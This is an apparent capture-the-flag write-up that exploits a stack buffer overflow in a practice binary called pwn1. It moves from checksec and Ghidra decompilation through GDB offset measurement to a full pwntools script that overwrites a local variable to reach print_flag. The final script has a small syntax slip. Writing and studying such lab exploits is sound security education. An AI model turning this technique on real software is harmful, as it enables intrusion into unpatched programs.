Let's start by looking at the  binary protections: 

```
mfumega@pwn-boy:/pwn-boy$ file pwn1
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
mfumega@pwn-boy:/pwn-boy$
mfumega@pwn-boy:/pwn-boy$ pwn checksec pwn1
[*] '/pwn-boy/pwn1'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

From this checksec output, we get the following info: 

- Full RELRO: Global Offset Table (GOT) is read only, preventing GOT overwrite attacks.
- No canary found: This means that we can overwrite the return address easily, because there is no canary here. (More on this later on future challenges)
- NX Enabled: Non-Executable stack, meaning that we cannot run shellcode directly on the stack.
- PIE enabled: Position Independant Executable. This means that ASLR applies to the binary itself, meaning its base address is randomized.

So, knowing this, we will now run the binary to see what happens.

```
mfumega@pwn-boy:/pwn-boy$ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
AAAA
I don't know that! Auuuuuuuugh!
```

Ok, not so useful. Let's open it on Ghidra to see what's happening. 

```
undefined4 main(void)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other  side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,_stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```
Before looking at the general behaviour of the binary, we can tell that there is this line `gets(local_43)`. This means that the input grabbed with `gets` will be placed at a variable with a size of 43 bytes.
The problem here is that this function does not validate the size of the input at the time of storing it into a variable, making the program vulnerable to a stack buffer overflow. 

This said, let's break down what the program is doing.

By looking at the main() function, we see that it first asks for our input and compare it with the string "Sir Lancelot of Camelot", at the line `iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");`.

After that, it will do the same, but against another string. This time "To seek the Holy Grail.". 

And then, finally, it will validate if a varuable stored at "local_18" is equal to "-0x215eef38". 

The idea here is to input first the 2 strings that the program is waiting for, and then overflow the buffer, to overwrite the value of a variable (local_18) to match the target value, and then be able to reach the call to `print_flag()` function. 

Let's run the program in GDB to see how is the stack conformed after we grab our input with `gets`.

I've inputted "AAAA" and hit the breakpoint. Here we can see the instruction we stoped at, as well as the stack. 

```
   0x565558aa <main+0131>      call   0x56555520 <gets@plt>
 → 0x565558af <main+0136>      add    esp, 0x10
   0x565558b2 <main+0139>      cmp    DWORD PTR [ebp-0x10], 0xdea110c8
   0x565558b9 <main+0140>      jne    0x565558c2 <main+329>
   0x565558bb <main+0142>      call   0x565556fd <print_flag>
   0x565558c0 <main+0147>      jmp    0x565558d4 <main+347>
   0x565558c2 <main+0149>      sub    esp, 0xc
────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn1", stopped 0x565558af in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565558af → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/30wx $esp
0xffffcec0:     0xffffcedd      0x56555a63      0xf7fa0620      0x00000000
0xffffced0:     0x00000000      0x00000000      0x01000000      0x41414109
0xffffcee0:     0x6b650041      0x65687420      0x6c6f4820      0x72472079
0xffffcef0:     0x2e6c6961      0xf7fd000a      0xf7d8e4be      0xf7fbe4a0
0xffffcf00:     0xffffcf40      0xf7fbe66c      0x00000000      0x00000002
0xffffcf10:     0xffffcf30      0xf7fa0000      0xf7ffd020      0xf7d97519
0xffffcf20:     0xffffd1b4      0x00000070      0xf7ffd000      0xf7d97519
0xffffcf30:     0x00000001      0xffffcfe4
```

And wee see out 4 'A', starting at 0xffffcedd. 

After the call to gets, we see a "add" instruction, adn then the "cmp". This is the C line that compares the value on the variable [ebp-0x10] against 0xdeall0c8. 
We can see where the variable is stored, as well as it's value by doing the following:

```
gef➤  p $ebp-0x10
$5 = (void *) 0xffffcf08
gef➤  p *0xffffcf08
$6 = 0x0
```

This is the address of the variable, and it's content, which is 0. 

So, our input starts at 0xffffcedd, and the target variable is at 0xffffcf08, meaning we must input 43 bytes until thatvariable. Let's input 43 'A' and 4 'B' to check this.

```
What... is my secret?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Breakpoint 1, 0x565558af in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcedd  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
$ebx   : 0x56556fb0  →  0x00001eb8
$ecx   : 0xf7fa19c0  →  0x00000000
$edx   : 0x1
$esp   : 0xffffcec0  →  0xffffcedd  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
$ebp   : 0xffffcf18  →  0xf7ffd020  →  0xf7ffda40  →  0x56555000  →   jg 0x56555047
$esi   : 0xffffcfe4  →  0xffffd1b4  →  "/pwn-boy/pwn1"
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x565558af  →  <main+0136> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcec0│+0x0000: 0xffffcedd  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"     ← $esp
0xffffcec4│+0x0004: 0x56555a63  →  "To seek the Holy Grail.\n"
0xffffcec8│+0x0008: 0xf7fa0620  →  0xfbad2288
0xffffcecc│+0x000c: 0x00000000
0xffffced0│+0x0010: 0x00000000
0xffffced4│+0x0014: 0x00000000
0xffffced8│+0x0018: 0x01000000
0xffffcedc│+0x001c: "\tAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"
────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0x565558a6 <main+012d>      lea    eax, [ebp-0x3b]
   0x565558a9 <main+0130>      push   eax
   0x565558aa <main+0131>      call   0x56555520 <gets@plt>
 → 0x565558af <main+0136>      add    esp, 0x10
   0x565558b2 <main+0139>      cmp    DWORD PTR [ebp-0x10], 0xdea110c8
   0x565558b9 <main+0140>      jne    0x565558c2 <main+329>
   0x565558bb <main+0142>      call   0x565556fd <print_flag>
   0x565558c0 <main+0147>      jmp    0x565558d4 <main+347>
   0x565558c2 <main+0149>      sub    esp, 0xc
────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn1", stopped 0x565558af in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x565558af → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p *0xffffcf08
$9 = 0x42424242
```

We've succesfully overwrite the variable with the 4 'B', or in hex 0x42424242. So, we now should put the target value '0xdea110c8' to get the flag. Let's do it with pwntools.

```
#!/usr/bin/env python3
from pwn import *
p = process('/pwn-boy/pwn1')

# Offset
offset = 43
target_value = 0xdea110c8

# Send the first 2 correct answers
p.sendline('Sir Lancelot of Camelot')
p.sendline('To seek the Holy Grail.')

# Prepare the payload
payload = b'A' * offset
payload += p32(target_value)

# Send and capture the response
p.sendline(payload)
response = p.recvall()
print(response.decode('latin-1')
``` 

Let's make the exploit executable, and run it.

```
mfumega@pwn-boy:/pwn-boy$ chmod +x do.py
mfumega@pwn-boy:/pwn-boy$ ./do.py
[+] Starting local process '/pwn-boy/pwn1': pid 320560
[+] Receiving all data: Done (211B)
[*] Process '/pwn-boy/pwn1' stopped with exit code 0 (pid 320560)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
local{mock_flag}
```

And we got the flag! 
